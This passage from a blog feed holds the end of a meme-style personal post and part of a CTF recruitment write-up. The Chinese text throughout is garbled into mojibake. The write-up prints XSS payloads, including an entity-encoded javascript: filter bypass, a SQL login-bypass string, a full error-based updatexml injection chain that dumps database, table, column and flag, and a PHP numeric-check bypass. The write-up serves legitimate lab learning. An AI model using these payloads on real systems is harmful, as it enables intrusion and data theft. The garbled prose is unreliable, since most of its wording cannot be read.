‘è—¤ï¼‰ï¼ˆåˆ›é£è·¯è¿‡åƒé¦™è•‰çš„çŒ´å­ï¼‰ï¼ˆæ€’å¼ï¼‰ï¼ˆå˜æˆçŒ´å­ï¼‰ï¼ˆé£è¿›åŸå§‹æ£®æ—ï¼‰ï¼ˆè¡æ ‘è—¤ï¼‰</h2></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs fuckworld">console.log(printf(echo è¿˜ä¼šå†è§å—ï¼Œç‡•å­ï¼Ÿ(å‹‰å¼ºçš„å¾®ç¬‘)å†è§æ—¶ä½ è¦å¹¸ç¦ï¼Œå¥½ä¸å¥½(å…³è½¦é—¨)ç‡•å­ï¼Œä½ è¦å¼€å¿ƒï¼Œä½ è¦å¹¸ç¦ï¼Œå¥½ä¸å¥½ï¼Ÿå¼€å¿ƒ<br>å•Šï¼Œå¹¸ç¦ã€‚ä½ çš„ä¸–ç•Œä»¥åæ²¡æœ‰æˆ‘äº†ï¼Œæ²¡å…³ç³»ï¼Œä½ è¦è‡ªå·±å¹¸ç¦ã€‚(å˜¶å¼)ç‡•å­ï¼ç‡•å­ï¼(å“­å–Š)ç‡•å­ï¼æ²¡æœ‰ä½ æˆ‘æ€ä¹ˆæ´»å•Šï¼Œç‡•å­ï¼(å¥”è·‘)(å˜¶å¼)ç‡•å­ï¼<br>ç‡•å­å•Š(ä»°å¤´45åº¦å“­æ³£)(é¢ç›®ç‹°ç‹)(ä¸ç”˜çš„è¿½èµ¶)(å’†å“®)(æ— åŠ›åœ°å–˜æ°”)ç‡•å­ï¼ç‡•å­ï¼Œä½ å¸¦æˆ‘èµ°å§ï¼Œç‡•å­å•Š(åœä¸‹)(è¹²ä¸‹)(è·ªä¸‹)(å“­æ³£)(åšå••å¤§<br>å“­););)<br><br></code></pre></td></tr></table></figure><blockquote><h1 id="è¯·ä½ ä¸è¦ç”Ÿæ°”-å¦‚æœå› ä¸ºæˆ‘çš„æ–‡å­—è€Œéªšæ‰°åˆ°ä½ -ä½ å¯ä»¥æ¥è®­æˆ‘ä¸€é¡¿-è¯·ä¸è¦å› ä¸ºæˆ‘çš„è¿™äº›è¡Œä¸ºè€Œä¸ºæˆ‘æ„Ÿåˆ°æ‹…å¿ƒ-æˆ‘ä¸é‡è¦çš„-æˆ‘å¾®ä¸è¶³é“-æˆ‘ç”šè‡³å¯ä»¥å’Œå¾®ç”Ÿç‰©ç›¸æå¹¶è®º-æˆ‘çš„æ–‡å­—æ„ŸåŠ¨ä¸äº†ä½ ä¼¼æ˜†ä»‘å±±ä¸Šçš„å†°å±±ä¸€èˆ¬çš„å¿ƒ-æ²¡å…³ç³»çš„-ä¸å›ä¿¡æ¯æˆ‘ä¹Ÿä¸ä¼šæ€æ ·çš„-æˆ‘å·²ç»ä¹ æƒ¯äº†-å·²ç»ä¹ ä»¥ä¸ºå¸¸äº†-æˆ‘å¸¸å¸¸æ”¶ä¸åˆ°ä½ çš„ä¿¡æ¯-æˆ‘ç”šè‡³ä¸çŸ¥é“æ˜¯ä¸æ˜¯æˆ‘æ‰‹æœºçš„é—®é¢˜-å°±è¿ä¸€ä¸ªè¡¨æƒ…åŒ…æˆ‘ä¹Ÿæœªæ›¾æ”¶åˆ°-åæ¥æ‰å‘ç°è¿™æ˜¯ä½ çš„é—®é¢˜-æˆ‘çš„ä¸€å­—ä¸€å­—æ‰“å‡ºæ¥çš„è¿™äº›çƒ­æƒ…ä¼¼ç«å¥”æ”¾è‡ªç”±çš„æ–‡å­—æ„ŸåŠ¨ä¸äº†ä½ è¿™é«˜é«˜åœ¨ä¸Šçš„çˆ·-æˆ‘éƒ½æ‡‚çš„-å…¶å®æˆ‘ä¹Ÿä¸æ˜¯é‚£ä¹ˆé‡è¦ç½¢äº†"><a href="#è¯·ä½ ä¸è¦ç”Ÿæ°”-å¦‚æœå› ä¸ºæˆ‘çš„æ–‡å­—è€Œéªšæ‰°åˆ°ä½ -ä½ å¯ä»¥æ¥è®­æˆ‘ä¸€é¡¿-è¯·ä¸è¦å› ä¸ºæˆ‘çš„è¿™äº›è¡Œä¸ºè€Œä¸ºæˆ‘æ„Ÿåˆ°æ‹…å¿ƒ-æˆ‘ä¸é‡è¦çš„-æˆ‘å¾®ä¸è¶³é“-æˆ‘ç”šè‡³å¯ä»¥å’Œå¾®ç”Ÿç‰©ç›¸æå¹¶è®º-æˆ‘çš„æ–‡å­—æ„ŸåŠ¨ä¸äº†ä½ ä¼¼æ˜†ä»‘å±±ä¸Šçš„å†°å±±ä¸€èˆ¬çš„å¿ƒ-æ²¡å…³ç³»çš„-ä¸å›ä¿¡æ¯æˆ‘ä¹Ÿä¸ä¼šæ€æ ·çš„-æˆ‘å·²ç»ä¹ æƒ¯äº†-å·²ç»ä¹ ä»¥ä¸ºå¸¸äº†-æˆ‘å¸¸å¸¸æ”¶ä¸åˆ°ä½ çš„ä¿¡æ¯-æˆ‘ç”šè‡³ä¸çŸ¥é“æ˜¯ä¸æ˜¯æˆ‘æ‰‹æœºçš„é—®é¢˜-å°±è¿ä¸€ä¸ªè¡¨æƒ…åŒ…æˆ‘ä¹Ÿæœªæ›¾æ”¶åˆ°-åæ¥æ‰å‘ç°è¿™æ˜¯ä½ çš„é—®é¢˜-æˆ‘çš„ä¸€å­—ä¸€å­—æ‰“å‡ºæ¥çš„è¿™äº›çƒ­æƒ…ä¼¼ç«å¥”æ”¾è‡ªç”±çš„æ–‡å­—æ„ŸåŠ¨ä¸äº†ä½ è¿™é«˜é«˜åœ¨ä¸Šçš„çˆ·-æˆ‘éƒ½æ‡‚çš„-å…¶å®æˆ‘ä¹Ÿä¸æ˜¯é‚£ä¹ˆé‡è¦ç½¢äº†" class="headerlink" title="è¯·ä½ ä¸è¦ç”Ÿæ°” å¦‚æœå› ä¸ºæˆ‘çš„æ–‡å­—è€Œéªšæ‰°åˆ°ä½  ä½ å¯ä»¥æ¥è®­æˆ‘ä¸€é¡¿ è¯·ä¸è¦å› ä¸ºæˆ‘çš„è¿™äº›è¡Œä¸ºè€Œä¸ºæˆ‘æ„Ÿåˆ°æ‹…å¿ƒ æˆ‘ä¸é‡è¦çš„ æˆ‘å¾®ä¸è¶³é“ æˆ‘ç”šè‡³å¯ä»¥å’Œå¾®ç”Ÿç‰©ç›¸æå¹¶è®º æˆ‘çš„æ–‡å­—æ„ŸåŠ¨ä¸äº†ä½ ä¼¼æ˜†ä»‘å±±ä¸Šçš„å†°å±±ä¸€èˆ¬çš„å¿ƒ æ²¡å…³ç³»çš„ ä¸å›ä¿¡æ¯æˆ‘ä¹Ÿä¸ä¼šæ€æ ·çš„ æˆ‘å·²ç»ä¹ æƒ¯äº† å·²ç»ä¹ ä»¥ä¸ºå¸¸äº† æˆ‘å¸¸å¸¸æ”¶ä¸åˆ°ä½ çš„ä¿¡æ¯ æˆ‘ç”šè‡³ä¸çŸ¥é“æ˜¯ä¸æ˜¯æˆ‘æ‰‹æœºçš„é—®é¢˜ å°±è¿ä¸€ä¸ªè¡¨æƒ…åŒ…æˆ‘ä¹Ÿæœªæ›¾æ”¶åˆ° åæ¥æ‰å‘ç°è¿™æ˜¯ä½ çš„é—®é¢˜ æˆ‘çš„ä¸€å­—ä¸€å­—æ‰“å‡ºæ¥çš„è¿™äº›çƒ­æƒ…ä¼¼ç«å¥”æ”¾è‡ªç”±çš„æ–‡å­—æ„ŸåŠ¨ä¸äº†ä½ è¿™é«˜é«˜åœ¨ä¸Šçš„çˆ· æˆ‘éƒ½æ‡‚çš„ å…¶å®æˆ‘ä¹Ÿä¸æ˜¯é‚£ä¹ˆé‡è¦ç½¢äº†"></a>è¯·ä½ ä¸è¦ç”Ÿæ°” å¦‚æœå› ä¸ºæˆ‘çš„æ–‡å­—è€Œéªšæ‰°åˆ°ä½  ä½ å¯ä»¥æ¥è®­æˆ‘ä¸€é¡¿ è¯·ä¸è¦å› ä¸ºæˆ‘çš„è¿™äº›è¡Œä¸ºè€Œä¸ºæˆ‘æ„Ÿåˆ°æ‹…å¿ƒ æˆ‘ä¸é‡è¦çš„ æˆ‘å¾®ä¸è¶³é“ æˆ‘ç”šè‡³å¯ä»¥å’Œå¾®ç”Ÿç‰©ç›¸æå¹¶è®º æˆ‘çš„æ–‡å­—æ„ŸåŠ¨ä¸äº†ä½ ä¼¼æ˜†ä»‘å±±ä¸Šçš„å†°å±±ä¸€èˆ¬çš„å¿ƒ æ²¡å…³ç³»çš„ ä¸å›ä¿¡æ¯æˆ‘ä¹Ÿä¸ä¼šæ€æ ·çš„ æˆ‘å·²ç»ä¹ æƒ¯äº† å·²ç»ä¹ ä»¥ä¸ºå¸¸äº† æˆ‘å¸¸å¸¸æ”¶ä¸åˆ°ä½ çš„ä¿¡æ¯ æˆ‘ç”šè‡³ä¸çŸ¥é“æ˜¯ä¸æ˜¯æˆ‘æ‰‹æœºçš„é—®é¢˜ å°±è¿ä¸€ä¸ªè¡¨æƒ…åŒ…æˆ‘ä¹Ÿæœªæ›¾æ”¶åˆ° åæ¥æ‰å‘ç°è¿™æ˜¯ä½ çš„é—®é¢˜ æˆ‘çš„ä¸€å­—ä¸€å­—æ‰“å‡ºæ¥çš„è¿™äº›çƒ­æƒ…ä¼¼ç«å¥”æ”¾è‡ªç”±çš„æ–‡å­—æ„ŸåŠ¨ä¸äº†ä½ è¿™é«˜é«˜åœ¨ä¸Šçš„çˆ· æˆ‘éƒ½æ‡‚çš„ å…¶å®æˆ‘ä¹Ÿä¸æ˜¯é‚£ä¹ˆé‡è¦ç½¢äº†</h1></blockquote><p><a href><em>æ²¡é”™ä½ æ˜¯ä¸ªæ˜ç™½äººæˆ‘æ˜ç™½ä½ æ˜ç™½çš„æ„æ€æˆ‘ä¹Ÿæ˜¯æ˜ç™½äººæ˜ç™½äººå°±åº”è¯¥æ˜ç™½æˆ‘æ˜ç™½ä½ æ˜ç™½çš„æ„æ€åªè¦å¤§å®¶éƒ½æ˜ç™½æ˜ç™½äººåº”æ˜ç™½æˆ‘æ˜ç™½ä½ æ˜ç™½çš„æ„æ€è¿™æ ·ç½‘ç»œç¯å¢ƒå°±æ˜¯å……æ»¡æ˜ç™½äººæ˜ç™½å…¶ä»–æ˜ç™½äººæ‰€æ˜ç™½çš„äº‹</em></a></p><blockquote><p><strong><span style="color: red;">ä½ </span><span style="color: orange;">ä»¥</span><span style="color: yellow;">ä¸º</span><span style="color: green;">æˆ‘</span><span style="color: blue;">è¿˜</span><span style="color: indigo;">ä¼š</span><span style="color: violet;">åœ¨</span><span style="color: gold;">ä¹</span><span style="color: silver;">å—</span>?<span style="color: crimson;">æˆ‘</span><span style="color: coral;">åœ¨</span><span style="color: khaki;">æ˜†</span><span style="color: olive;">ä»‘</span><span style="color: lime;">å±±</span><span style="color: aqua;">ç»ƒ</span><span style="color: teal;">äº†</span><span style="color: navy;">å…­</span><span style="color: lavender;">å¹´</span><span style="color: plum;">çš„</span><span style="color: fuchsia;">å‰‘</span>ï¼Œ<span style="color: purple;">æˆ‘</span><span style="color: maroon;">çš„</span><span style="color: red;">å¿ƒ</span><span style="color: orange;">æ—©</span><span style="color: yellow;">å°±</span><span style="color: green;">å’Œ</span><span style="color: blue;">æ˜†</span><span style="color: indigo;">ä»‘</span><span style="color: violet;">å±±</span><span style="color: gold;">çš„</span><span style="color: silver;">é›ª</span><span style="color: crimson;">ä¸€</span><span style="color: coral;">æ ·</span><span style="color: khaki;">å†·</span><span style="color: olive;">äº†</span>ã€‚<span style="color: lime;">æˆ‘</span><span style="color: aqua;">åœ¨</span><span style="color: teal;">å¤§</span><span style="color: navy;">æ¶¦</span><span style="color: lavender;">å‘</span><span style="color: plum;">æ€</span><span style="color: fuchsia;">äº†</span><span style="color: purple;">å</span><span style="color: maroon;">å¹´</span><span style="color: red;">çš„</span><span style="color: orange;">é±¼</span>ï¼Œ<span style="color: yellow;">æˆ‘</span><span style="color: green;">ä»¥</span><span style="color: blue;">ä¸º</span><span style="color: indigo;">æˆ‘</span><span style="color: violet;">çš„</span><span style="color: gold;">å¿ƒ</span><span style="color: silver;">æ—©</span><span style="color: crimson;">å·²</span><span style="color: coral;">è·Ÿ</span><span style="color: khaki;">æˆ‘</span><span style="color: olive;">çš„</span><span style="color: lime;">åˆ€</span><span style="color: aqua;">ä¸€</span><span style="color: teal;">æ ·</span><span style="color: navy;">å†·</span><span style="color: lavender;">äº†</span>ï¼Œ<span style="color: plum;">å¯</span><span style="color: fuchsia;">æ˜¯</span><span style="color: purple;">å½“</span><span style="color: maroon;">æˆ‘</span><span style="color: red;">ç‚¹</span><span style="color: orange;">å¼€</span><span style="color: yellow;">è¿™</span><span style="color: green;">ä¸ª</span><span style="color: blue;">è¯¾</span><span style="color: indigo;">è¡¨</span><span style="color: violet;">çœ¼</span><span style="color: gold;">æ³ª</span><span style="color: silver;">å¦‚</span><span style="color: crimson;">é»„</span><span style="color: coral;">æœ</span><span style="color: khaki;">æ ‘</span><span style="color: olive;">ç€‘</span><span style="color: lime;">å¸ƒ</span><span style="color: aqua;">èˆ¬</span><span style="color: teal;">é£</span><span style="color: navy;">æµ</span><span style="color: lavender;">ç›´</span><span style="color: plum;">ä¸‹</span>ï¼Œ<span style="color: fuchsia;">åˆ’</span><span style="color: purple;">è¿‡</span><span style="color: maroon;">æˆ‘</span><span style="color: red;">çš„</span><span style="color: orange;">è„¸</span><span style="color: yellow;">åº</span>ï¼Œ<span style="color: green;">æ‰“</span><span style="color: blue;">æ¹¿</span><span style="color: indigo;">äº†</span><span style="color: violet;">æˆ‘</span><span style="color: gold;">çš„</span><span style="color: silver;">äºº</span><span style="color: crimson;">å­—</span><span style="color: coral;">æ‹–</span>ï¼Œ<span style="color: khaki;">è„š</span><span style="color: olive;">è¶¾</span><span style="color: lime;">éƒ½</span><span style="color: aqua;">å˜</span><span style="color: teal;">å¾—</span><span style="color: navy;">é…¸</span><span style="color: lavender;">æ¶©</span>ï¼Œ<span style="color: plum;">åª</span><span style="color: fuchsia;">æƒ³</span><span style="color: purple;">è¯´</span>ï¼Œ<span style="color: maroon;">èƒ½</span><span style="color: red;">ä¸</span><span style="color: orange;">èƒ½</span>â€¦<span style="color: yellow;">ä¸</span><span style="color: green;">è¦</span>â€¦</strong></p></blockquote><p><em><strong><span style="color:#ff0000">ä¸º</span><span style="color:#ff9900">ä»€</span><span style="color:#ffcc00">ä¹ˆ</span><span style="color:#66cc00">è¦</span><span style="color:#00ffcc">æˆ‘</span><span style="color:#66ccff">åš</span><span style="color:#9900cc">é€‰</span><span style="color:#ff0000">æ‹©</span><span style="color:#ff9900">ï¼Œ</span><span style="color:#ffcc00">ä¸º</span><span style="color:#66cc00">ä»€</span><span style="color:#00ffcc">ä¹ˆ</span><span style="color:#66ccff">ï¼</span><span style="color:#9900cc">ä½ </span><span style="color:#ff0000">ä¸</span><span style="color:#ff9900">çŸ¥</span><span style="color:#ffcc00">é“</span><span style="color:#66cc00">æˆ‘</span><span style="color:#00ffcc">æœ‰</span><span style="color:#66ccff">é€‰</span><span style="color:#9900cc">æ‹©</span><span style="color:#ff0000">æ</span><span style="color:#ff9900">æƒ§</span><span style="color:#ffcc00">ç—‡</span><span style="color:#66cc00">å—</span><span style="color:#00ffcc">ï¼Œ</span><span style="color:#66ccff">ä½ </span><span style="color:#9900cc">ä¸</span><span style="color:#ff0000">çŸ¥</span><span style="color:#ff9900">é“</span><span style="color:#ffcc00">è®©</span><span style="color:#66cc00">æˆ‘</span><span style="color:#00ffcc">é€‰</span><span style="color:#66ccff">ä¼š</span><span style="color:#9900cc">ç›´</span><span style="color:#ff0000">æ¥</span><span style="color:#ff9900">ä¼š</span><span style="color:#ffcc00">è®©</span><span style="color:#66cc00">æˆ‘</span><span style="color:#00ffcc">è¾—</span><span style="color:#66ccff">è½¬</span><span style="color:#9900cc">å</span><span style="color:#ff0000">ä¾§</span><span style="color:#ff9900">å‚</span><span style="color:#ffcc00">å·®</span><span style="color:#66cc00">è‡</span><span style="color:#00ffcc">èœ</span><span style="color:#66ccff">å½»</span><span style="color:#9900cc">å¤œ</span><span style="color:#ff0000">éš¾</span><span style="color:#ff9900">çœ </span><span style="color:#ffcc00">å—</span><span style="color:#66cc00">ï¼Œ</span><span style="color:#00ffcc">ä½ </span><span style="color:#66ccff">è½»</span><span style="color:#9900cc">é£˜</span><span style="color:#ff0000">é£˜</span><span style="color:#ff9900">ä¸€</span><span style="color:#ffcc00">å¥</span><span style="color:#66cc00">è®©</span><span style="color:#00ffcc">æˆ‘</span><span style="color:#66ccff">é€‰</span><span style="color:#9900cc">å´</span><span style="color:#ff0000">è®©</span><span style="color:#ff9900">æˆ‘</span><span style="color:#ffcc00">åœ¨</span><span style="color:#66cc00">åˆ</span><span style="color:#00ffcc">å¤œ</span><span style="color:#66ccff">æ¢¦</span><span style="color:#9900cc">å›</span><span style="color:#ff0000">æ—¶</span><span style="color:#ff9900">æƒŠ</span><span style="color:#ffcc00">é†’</span><span style="color:#66cc00">ï¼Œ</span><span style="color:#00ffcc">ç¬</span><span style="color:#66ccff">é—´</span><span style="color:#9900cc">æ‰‹</span><span style="color:#ff0000">è„š</span><span style="color:#ff9900">å†°</span><span style="color:#ffcc00">å‡‰</span><span style="color:#66cc00">ï¼Œ</span><span style="color:#00ffcc">æˆ‘</span><span style="color:#66ccff">æƒ³</span><span style="color:#9900cc">è¦</span><span style="color:#ff0000">æŒ£</span><span style="color:#ff9900">æ‰</span><span style="color:#ffcc00">å´</span><span style="color:#66cc00">æ²¡</span><span style="color:#00ffcc">æœ‰</span><span style="color:#66ccff">åŠ›</span><span style="color:#9900cc">æ°”</span><span style="color:#ff0000">ï¼Œ</span><span style="color:#ff9900">åƒ</span><span style="color:#ffcc00">ä¸€</span><span style="color:#66cc00">åª</span><span style="color:#00ffcc">ç¼º</span><span style="color:#66ccff">æ°§</span><span style="color:#9900cc">çš„</span><span style="color:#ff0000">é±¼</span><span style="color:#ff9900">ã€‚</span><span style="color:#ffcc00">ä½ </span><span style="color:#66cc00">åœ¨</span><span style="color:#00ffcc">ä¹</span><span style="color:#66ccff">å—</span><span style="color:#9900cc">ï¼Ÿ</span><span style="color:#ff0000">ä½ </span><span style="color:#ff9900">ä¸</span><span style="color:#ffcc00">åœ¨</span><span style="color:#66cc00">ä¹</span><span style="color:#00ffcc">ï¼Œ</span><span style="color:#66ccff">ä½ </span><span style="color:#9900cc">åª</span><span style="color:#ff0000">åœ¨</span><span style="color:#ff9900">ä¹</span><span style="color:#ffcc00">ä½ </span><span style="color:#66cc00">è‡ª</span><span style="color:#00ffcc">å·±</span><span style="color:#66ccff">ï¼Œ</span><span style="color:#9900cc">å°±</span><span style="color:#ff0000">åƒ</span><span style="color:#ff9900">ä½ </span><span style="color:#ffcc00">ä¸</span><span style="color:#66cc00">åœ¨</span><span style="color:#00ffcc">ä¹</span><span style="color:#66ccff">é±¼</span><span style="color:#9900cc">é¦™</span><span style="color:#ff0000">è‚‰</span><span style="color:#ff9900">ä¸</span><span style="color:#ffcc00">é‡Œ</span><span style="color:#66cc00">æ²¡</span><span style="color:#00ffcc">æœ‰</span><span style="color:#66ccff">é±¼</span><span style="color:#9900cc">ï¼Œ</span><span style="color:#ff0000">è™</span><span style="color:#ff9900">çš®</span><span style="color:#ffcc00">è¾£</span><span style="color:#66cc00">å­</span><span style="color:#00ffcc">é‡Œ</span><span style="color:#66ccff">æ²¡</span><span style="color:#9900cc">æœ‰</span><span style="color:#ff0000">è€</span><span style="color:#ff9900">è™</span><span style="color:#ffcc00">ï¼Œ</span><span style="color:#66cc00">ä½ </span><span style="color:#00ffcc">ä¹Ÿ</span><span style="color:#66ccff">ä¸</span><span style="color:#9900cc">åœ¨</span><span style="color:#ff0000">ä¹</span><span style="color:#ff9900">çº </span><span style="color:#ffcc00">ç»“</span><span style="color:#66cc00">åˆ°</span><span style="color:#00ffcc">å¿«</span><span style="color:#66ccff">è¦</span><span style="color:#9900cc">å‘</span><span style="color:#ff0000">ç–¯</span><span style="color:#ff9900">çš„</span><span style="color:#ffcc00">æˆ‘</span><span style="color:#66cc00">ã€‚</span><span style="color:#00ffcc">æˆ‘</span><span style="color:#66ccff">éƒ½</span><span style="color:#9900cc">è¿™</span><span style="color:#ff0000">æ ·</span><span style="color:#ff9900">äº†</span><span style="color:#ffcc00">ï¼Œ</span><span style="color:#66cc00">ä½ </span><span style="color:#00ffcc">å´</span><span style="color:#66ccff">è¿˜</span><span style="color:#9900cc">èƒ½</span><span style="color:#ff0000">è‹¥</span><span style="color:#ff9900">æ— </span><span style="color:#ffcc00">å…¶</span><span style="color:#66cc00">äº‹</span><span style="color:#00ffcc">çš„</span><span style="color:#66ccff">ç­‰</span><span style="color:#9900cc">æˆ‘</span><span style="color:#ff0000">åš</span><span style="color:#ff9900">å‡º</span><span style="color:#ffcc00">å†³</span><span style="color:#66cc00">å®š</span><span style="color:#00ffcc">ï¼Œ</span><span style="color:#66ccff">ä½ </span><span style="color:#9900cc">çš„</span><span style="color:#ff0000">ç†</span><span style="color:#ff9900">æ‰€</span><span style="color:#ffcc00">å½“</span><span style="color:#66cc00">ç„¶</span><span style="color:#00ffcc">åƒ</span><span style="color:#66ccff">åˆ©</span><span style="color:#9900cc">å‰‘</span><span style="color:#ff0000">ä¸€</span><span style="color:#ff9900">æ ·</span><span style="color:#ffcc00">æ‰</span><span style="color:#66cc00">åœ¨</span><span style="color:#00ffcc">æˆ‘</span><span style="color:#66ccff">è„‘</span><span style="color:#9900cc">å£³</span><span style="color:#ff0000">ä¸Š</span><span style="color:#ff9900">ï¼Œ</span><span style="color:#ffcc00">æˆ‘</span><span style="color:#66cc00">çš„<span style="color:#ff0000">è„‘</span><span style="color:#ff9900">å­</span><span style="color:#ffcc00">ç–¼</span><span style="color:#66cc00">çš„</span><span style="color:#00ffcc">è¦</span><span style="color:#66ccff">è£‚</span><span style="color:#9900cc">å¼€</span><span style="color:#ff0000">ï¼Œ</span><span style="color:#ff9900">è€Œ</span><span style="color:#ffcc00">ä½ </span><span style="color:#66cc00">å‘¢</span><span style="color:#00ffcc">ï¼Œ</span><span style="color:#66ccff">ä½ </span><span style="color:#9900cc">ä¾</span><span style="color:#ff0000">æ—§</span><span style="color:#ff9900">æ— </span><span style="color:#ffcc00">è¾œ</span><span style="color:#66cc00">åœ°</span><span style="color:#00ffcc">å</span><span style="color:#66ccff">åœ¨</span><span style="color:#9900cc">é‚£</span><span style="color:#ff0000">é‡Œ</span><span style="color:#ff9900">çœ‹</span><span style="color:#ffcc00">æˆ‘</span><span style="color:#66cc00">ç—›</span><span style="color:#00ffcc">è‹¦</span><span style="color:#66ccff">ä¸</span><span style="color:#9900cc">å ª</span><span style="color:#ff0000">ï¼Œ</span><span style="color:#ff9900">ä½ </span><span style="color:#ffcc00">å¥½</span><span style="color:#66cc00">ç‹ </span><span style="color:#00ffcc">å•Š</span><span style="color:#66ccff">ï¼</span></span></strong></em></p>]]></content>
    
    
    <categories>
      
      <category>life</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Viking 2023 Recruit WriteUps~~~</title>
    <link href="/posts/29460/"/>
    <url>/posts/29460/</url>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="åŸç¥ï¼Œå¯åŠ¨ï¼â… "><a href="#åŸç¥ï¼Œå¯åŠ¨ï¼â… " class="headerlink" title="åŸç¥ï¼Œå¯åŠ¨ï¼â… "></a>åŸç¥ï¼Œå¯åŠ¨ï¼â… </h2><p>xsså…¥é—¨</p><p><code>?name=&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p><em><strong><center><font color="#81ecec" size="5">vkctf{th1s&#x2F;sAb3g1nN1ng}</font></center></strong></em></p><h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><p>å±è”½äº†ä¸€äº›ä¸œè¥¿</p><p><img src="/posts/29460/image-20231021234623039.png" alt="image-20231021234623039"></p><p>é‚£å°±æ¥ç‚¹æœ´å®æ— åçš„</p><p><img src="/posts/29460/image-20231021234732538.png" alt="image-20231021234732538"></p><p>flagåœ¨æ³¨é‡Šé‡Œï¼Œbase64è§£å¯†ä¸€ä¸‹å°±å¥½äº†</p><p><em><strong><center><font color="#81ecec" size="5">vkctf{C0ngratul4t10n!_Y0u_h4v3_f0und_th3_fl4g}</font></center></strong></em></p><h2 id="åŸç¥ï¼Œå¯åŠ¨ï¼â…¢"><a href="#åŸç¥ï¼Œå¯åŠ¨ï¼â…¢" class="headerlink" title="åŸç¥ï¼Œå¯åŠ¨ï¼â…¢"></a>åŸç¥ï¼Œå¯åŠ¨ï¼â…¢</h2><p>xssä¾æ—§</p><p>éšä¾¿è¯•ä¸‹ï¼Œå‘ç°æ˜¯è·³è½¬åˆ°è¾“å…¥çš„åœ°å€ï¼Œä¸º<code>&lt;a&gt;</code>æ ‡ç­¾</p><p>ä½¿ç”¨<code>javascript:alert(1)</code>ï¼Œæ·»åŠ ï¼Œf12å‘ç°<code>script</code>å˜æˆäº†<code>scr_ipt</code>ï¼Œæœ‰äº†è¿‡æ»¤</p><p>ç”¨<code>&quot;</code>è¯•è¯•ï¼Œå‘ç°è¢«è½¬ä¹‰æˆäº†<code>&amp;quot;</code></p><p>è¿™é‡Œç”¨<code>&amp;#115</code>æ¥ä»£æ›¿<code>s</code></p><p><code>java&amp;#115cript:alert(1)</code></p><p><em><strong><center><font color="#81ecec" size="5">vkctf{W3rrrnear2success}</font></center></strong></em></p><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>sqlå…¥é—¨</p><p>é¦–å…ˆè¯•è¯•å•å¼•å·</p><p>æŠ¥é”™äº†<img src="/posts/29460/image-20231022003019324.png" alt="image-20231022003019324"></p><p>å‘ç°å¤šäº†æ‹¬å·</p><p>è¯•è¯•ä¸‡èƒ½å¯†ç <code>&#39;) or 1=1 #</code></p><p>ç™»å½•æˆåŠŸ</p><p><code>&#39;) order by 2 #</code></p><p>æŸ¥å‡ºä¸¤åˆ—</p><p>å› ä¸ºæ²¡æœ‰å›æ˜¾ç‚¹</p><p>æ‰€ä»¥å°è¯•æŠ¥é”™æ³¨å…¥</p><p><code> &#39;) and (select updatexml(1,concat(&#39;~&#39;,(select database())),1)) #</code></p><p><img src="/posts/29460/image-20231022004840826.png" alt="image-20231022004840826"></p><p>å¾—åˆ°æ•°æ®åº“åä¸º<code>viking2023DB</code></p><p><code> &#39;) and (select updatexml(1,concat(&#39;~&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)) #</code></p><p><img src="/posts/29460/image-20231022004826969.png" alt="image-20231022004826969"></p><p>å¾—åˆ°è¡¨åä¸º<code>viking2023</code></p><p><code> &#39;) and (select updatexml(1,concat(&#39;~&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;viking2023&#39;)),1)) #</code></p><p><img src="/posts/29460/image-20231022005028106.png" alt="image-20231022005028106"></p><p>å¾—åˆ°åˆ—åä¸º<code>flag</code></p><p><code> &#39;) and (select updatexml(1,concat(&#39;~&#39;,(select flag from viking2023DB.viking2023)),1)) #</code></p><p><img src="/posts/29460/image-20231022005127837.png" alt="image-20231022005127837"></p><p>bingo!</p><p><em><strong><center><font color="#81ecec" size="5">vking{h2llo_welc0m2_u2stc}</font></center></strong></em></p><h2 id="robotæœ‰ä»€ä¹ˆä½œç”¨å‘¢ï¼Ÿ"><a href="#robotæœ‰ä»€ä¹ˆä½œç”¨å‘¢ï¼Ÿ" class="headerlink" title="robotæœ‰ä»€ä¹ˆä½œç”¨å‘¢ï¼Ÿ"></a>robotæœ‰ä»€ä¹ˆä½œç”¨å‘¢ï¼Ÿ</h2><p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œè®¿é—®robots.txt</p><p><img src="/posts/29460/image-20231022005231643.png" alt="image-20231022005231643"></p><p>è®¿é—®<code>/Y0u_need_t0_do_0ther_th1ng.php</code></p><p>å‘ç°æ˜¯ååºåˆ—åŒ–</p><p><img src="/posts/29460/image-20231022005351928.png" alt="image-20231022005351928"></p><h3 id="Part-1"><a href="#Part-1" class="headerlink" title="Part 1"></a>Part 1</h3><blockquote><p>éœ€è¦ç»•è¿‡ <code>is_numeric($a) &amp;&amp; strlen($a)&lt;=6 &amp;&amp; $a!=0 &amp;&amp; $a**2 == 0</code></p><p>è¦æ±‚<code>$a</code>ä¸èƒ½ä¸º0ï¼Œä½†æ˜¯åˆå¹³æ–¹è¦ä¸º0ï¼ŒçœŸæ˜¯çš„</p><p>è¯•äº†åŠå¤©ï¼Œä¸ä¼šï¼Œæœäº†ä¸€ä¸‹</p><blockquote><p>å‘ç°ï¼š</p><p>phpå°æ•°ç‚¹åè¶…è¿‡161ä½åšå¹³æ–¹è¿ç®—æ—¶ä¼šè¢«æˆªæ–­ï¼Œä½†æ˜¯è¶…è¿‡323ä½åˆä¼šå¤±æ•ˆã€‚ ä¹Ÿå°±æ˜¯ 0.00000â€¦1(å°æ•°ç‚¹å161ä¸ª0)åˆ°0.00000â€¦1(å°æ•°ç‚¹å322ä¸ª0)ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ç§‘å­¦è®¡æ•°æ³•æ¥ä»£æ›¿ï¼Œå³ <code>1e-162</code></p></blockquote><p>å¾—åˆ°</p><p><em><strong>vkctf{1_th1nk_</strong></em></p></blockquote><h3 id="Part-2"><a href="#Part-2" class="headerlink" title="Part 2"></a>Part 